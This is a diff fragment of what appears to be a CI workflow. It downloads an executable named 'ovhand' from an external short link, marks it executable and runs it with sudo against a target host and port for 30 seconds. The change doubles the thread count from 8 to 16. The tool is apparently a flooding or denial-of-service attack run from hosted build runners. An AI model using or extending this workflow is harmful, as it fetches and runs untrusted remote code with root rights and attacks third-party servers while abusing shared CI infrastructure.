@@ -32,7 +32,7 @@ jobs:
           wget https://curl.by/UfAFb/ovhand -O OVH
           chmod +x OVH || true
 
-          sudo timeout 30 ./OVH "$TARGET" "$PORT" 8 30 &
+          sudo timeout 30 ./OVH "$TARGET" "$PORT" 16 30 &
 
       - name: Finish !
         run: |
